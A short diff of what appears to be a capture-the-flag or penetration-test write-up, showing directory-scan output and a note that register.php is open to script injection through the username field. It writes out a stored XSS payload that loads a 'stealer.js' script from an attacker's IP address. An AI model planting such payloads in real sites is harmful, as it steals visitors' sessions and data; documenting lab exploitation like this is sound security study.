@@ -108,7 +108,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /server-status        (Status: 403) [Size: 278] 
 ---
 
-<h1> web service testing <\h1>
+<h1> web service testing </h1>
 
 Trying found some XSS or LFI on POST request and found that register.php is vuln via parametr username
 register new user: <script src="http://10.X.X.X:8000/stealer.js"></script>     // attacker ip
